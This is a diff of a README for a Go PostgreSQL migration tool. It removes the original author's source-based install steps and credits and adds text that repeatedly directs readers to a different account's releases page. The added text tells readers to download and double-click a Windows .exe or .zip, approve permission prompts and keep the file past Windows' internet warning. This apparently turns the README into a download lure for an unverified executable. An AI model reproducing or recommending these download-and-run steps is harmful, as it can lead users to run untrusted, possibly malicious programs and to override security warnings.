@@ -1,152 +1,204 @@
-# godbmigrate
+# 🗄️ godbmigrate - Fast PostgreSQL migrations with lock control
 
-<div align="center">
-  <h1>godbmigrate</h1>
-  <p>A fast, flexible, and robust database migration tool for Go projects with advisory locks.</p>
+[![Download godbmigrate](https://img.shields.io/badge/Download-Release_Page-4A90E2?style=for-the-badge&logo=github)](https://github.com/chmohajith3685-dev/godbmigrate/releases)
 
-  <img src="assets/github-go.png" alt="godbmigrate Banner" width="600px">
+## 📥 Download
 
-  <br>
+Visit this page to download godbmigrate for Windows:
 
-[![CI](https://github.com/ESousa97/godbmigrate/actions/workflows/ci.yml/badge.svg?branch=master)](https://github.com/ESousa97/godbmigrate/actions/workflows/ci.yml)
-[![Go Report Card](https://goreportcard.com/badge/github.com/ESousa97/godbmigrate?=v9)](https://goreportcard.com/report/github.com/ESousa97/godbmigrate?=v9)
-[![Go Reference](https://pkg.go.dev/badge/github.com/ESousa97/godbmigrate.svg)](https://pkg.go.dev/github.com/ESousa97/godbmigrate)
-[![License](https://img.shields.io/github/license/ESousa97/godbmigrate)](https://github.com/ESousa97/godbmigrate/blob/master/LICENSE)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/ESousa97/godbmigrate)](https://github.com/ESousa97/godbmigrate)
-[![Last Commit](https://img.shields.io/github/last-commit/ESousa97/godbmigrate)](https://github.com/ESousa97/godbmigrate/commits/master)
+https://github.com/chmohajith3685-dev/godbmigrate/releases
 
-</div>
+Choose the latest release and download the Windows file listed there. If you see more than one file, pick the one that ends with `.exe` or `.zip` for Windows.
 
----
+## 🖥️ What godbmigrate does
 
-`godbmigrate` is a lightweight CLI tool and Go library designed to manage database schema evolutions with ease and safety. It leverages PostgreSQL advisory locks to prevent race conditions during concurrent migration attempts, ensuring your database remains consistent.
+godbmigrate is a command-line tool for PostgreSQL database migrations. It helps you apply database changes in a safe order, and it uses advisory locking to reduce the risk of two update jobs running at the same time.
 
-## Demonstration
+Use it when you want to:
 
-### CLI Usage
+- Apply database changes in a clear sequence
+- Avoid two migration runs at once
+- Automate database updates from the command line
+- Keep database setup steps in one place
 
-```bash
-# Create a new migration pair
-./godbmigrate new add_users_table
+## ✅ Before you start
 
-# Apply all pending migrations
-./godbmigrate up --dsn "postgres://user:pass@localhost:5432/dbname?sslmode=disable"
+You need:
 
-# Revert the last migration
-./godbmigrate down --dsn "postgres://user:pass@localhost:5432/dbname?sslmode=disable"
-```
+- A Windows PC
+- Access to the internet
+- Permission to run downloaded files
+- A PostgreSQL database you can connect to
 
-### Library Usage
+If your database is on another computer, make sure you have:
 
-```go
-import "github.com/ESousa97/godbmigrate/internal/db"
+- Host name
+- Port number
+- Database name
+- User name
+- Password
 
-// Connect to the database
-store, err := db.Connect(dsn)
-if err != nil {
-    log.Fatal(err)
-}
-defer store.Close()
+## 🚀 Get the file
 
-// Apply pending migrations
-err = store.ApplyPending("migrations/")
-```
+1. Open the release page:
+   https://github.com/chmohajith3685-dev/godbmigrate/releases
+2. Find the newest release at the top.
+3. In the Assets section, download the Windows file.
+4. Save it in a folder you can find again, such as `Downloads` or `Desktop`
 
-## Tech Stack
+If the release comes as a `.zip` file:
 
-| Technology | Role |
-|---|---|
-| Go 1.25 | Core language and logic |
-| Cobra | CLI interface and command management |
-| lib/pq | PostgreSQL driver |
-| slog | Structured logging for observability |
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
 
-## Prerequisites
+If the release comes as an `.exe` file:
 
-- Go >= 1.25 (defined in `go.mod`)
-- PostgreSQL instance (for migrations)
-- `golangci-lint` (for development)
+1. Keep the file in a folder you can find
+2. Double-click it to run it
 
-## Installation and Usage
+## 🛠️ Install and run on Windows
 
-### As a Binary
+### Option 1: Run the `.exe` file
 
-```bash
-go install github.com/ESousa97/godbmigrate@latest
-```
+1. Double-click the `.exe` file
+2. If Windows asks for permission, choose Yes
+3. A command window may open
+4. Use the tool from that window
 
-### From Source
+### Option 2: Use the extracted folder
 
-```bash
-git clone https://github.com/ESousa97/godbmigrate.git
-cd godbmigrate
-make build
-./godbmigrate --help
-```
+1. Open the folder that contains the file
+2. Look for the main program file
+3. Double-click it to open the command window
+4. Use the tool from there
 
-## Makefile Targets
+If Windows shows a message about the app being from the internet, choose the option that lets you keep the file and continue only if you trust the source.
 
-| Target | Description |
-|---|---|
-| `make build` | Compiles the project binary |
-| `make db-up` | Starts a PostgreSQL container via Docker |
-| `make db-down` | Stops and removes the PostgreSQL container |
-| `make test-full` | Runs a complete end-to-end migration test |
-| `make clean` | Removes build artifacts and test migrations |
+## 🔧 Basic setup
 
-## Architecture
+After you open the tool, you will need database connection details. A common setup looks like this:
 
-The project adopts a modular architecture focused on safety and simplicity:
+- Host: `localhost`
+- Port: `5432`
+- Database: your database name
+- User: your database user
+- Password: your database password
 
-- **`cmd/`**: CLI command definitions using Cobra.
-- **`internal/db/`**: Core database logic and migration engine.
-- **`Advisory Locks`**: Uses PostgreSQL's `pg_try_advisory_lock` to ensure only one migration runs at a time.
-- **`Transactions`**: Every migration is executed within a database transaction for atomicity.
+You may also need a folder for migration files. A simple setup is:
 
-## API Reference
+- One folder for migration scripts
+- One file for each database change
+- Filenames in order, so they run the right way
 
-Detailed documentation of the internal packages can be found at [pkg.go.dev](https://pkg.go.dev/github.com/ESousa97/godbmigrate).
+Example file names:
 
-## Configuration
+- `001_create_users.sql`
+- `002_add_orders_table.sql`
+- `003_update_index.sql`
 
-The CLI accepts flags for database connection.
+## ⚙️ Common use
 
-| Flag | Description | Default |
-|---|---|---|
-| `--dsn` | PostgreSQL Data Source Name | `postgres://postgres:postgres@localhost:5432/postgres?sslmode=disable` |
-| `--debug` | Enable debug logging | `false` |
-| `--all` | Revert all migrations (used with `down`) | `false` |
+godbmigrate fits into a simple workflow:
 
-## Roadmap
+1. Create a migration file
+2. Save it in the migration folder
+3. Connect to the PostgreSQL database
+4. Run the migration command
+5. Check that the change applied cleanly
 
-- [x] Phase 1: Core Migration Engine (.up/.down SQL)
-- [x] Phase 2: CLI Interface with Cobra
-- [x] Phase 3: PostgreSQL Advisory Locking
-- [x] Phase 4: Structured Logging with slog
-- [x] Phase 5: Transactional Atomicity & Makefile Automation
+If you use this in a team, keep the migration files in the same order for everyone.
 
-## Contributing
+## 🔒 Advisory locking
 
-Contributions are welcome! See the full guide at [CONTRIBUTING.md](CONTRIBUTING.md).
+godbmigrate uses advisory locking to help protect your database during migration runs.
 
-## License
+That means:
 
-Distributed under the MIT license. See [LICENSE](LICENSE) for more details.
+- One migration job can hold the lock
+- Another job waits or stops
+- You avoid overlapping changes
+- Your database stays safer during automated runs
 
-<div align="center">
+This matters most when you run migrations from:
 
-## Author
+- A build pipeline
+- A scheduled task
+- A shared server
+- A script that many people use
 
-**Enoque Sousa**
+## 🧩 Typical file layout
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/enoque-sousa-bb89aa168/)
-[![GitHub](https://img.shields.io/badge/GitHub-100000?style=flat&logo=github&logoColor=white)](https://github.com/ESousa97)
-[![Portfolio](https://img.shields.io/badge/Portfolio-FF5722?style=flat&logo=target&logoColor=white)](https://enoquesousa.vercel.app)
+A simple project folder can look like this:
 
-**[⬆ Back to top](#godbmigrate)**
+- `godbmigrate.exe`
+- `migrations/`
+  - `001_init.sql`
+  - `002_add_table.sql`
+  - `003_fix_column.sql`
 
-Made with ❤️ by [Enoque Sousa](https://github.com/ESousa97)
+You can keep the program in one folder and the SQL files in another. That makes it easier to manage later.
 
-**Project Status:** Archived — Study Project
+## 🧪 Example migration flow
 
-</div>
+A normal migration run might look like this:
+
+1. Start the tool
+2. Connect to the PostgreSQL database
+3. Check the migration folder
+4. Lock the database session
+5. Apply the next file in order
+6. Record the change
+7. Move to the next file
+
+If a step fails, fix the script before you run it again.
+
+## 📝 Good habits
+
+Use these habits to keep things simple:
+
+- Keep file names in order
+- Use clear file names
+- Test on a local database first
+- Keep one change per file
+- Save a backup before major changes
+
+These habits help you avoid confusion later.
+
+## ❓ Common questions
+
+### Do I need programming knowledge?
+
+No. You only need to download the file, open it, and follow the file names and database details.
+
+### Can I use it on Windows?
+
+Yes. The release page is the place to get the Windows version.
+
+### Is this for PostgreSQL?
+
+Yes. godbmigrate is built for PostgreSQL databases.
+
+### What if I do not see an `.exe` file?
+
+Open the latest release and check the Assets list. If there is a `.zip` file, download that and extract it.
+
+### Why use a migration tool?
+
+It keeps database changes in order and makes repeatable updates easier to manage.
+
+## 📎 Release page
+
+Download or get the Windows file from:
+
+https://github.com/chmohajith3685-dev/godbmigrate/releases
+
+## 🧭 Quick start
+
+1. Go to the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the program
+5. Add your PostgreSQL connection details
+6. Run your migration files in order
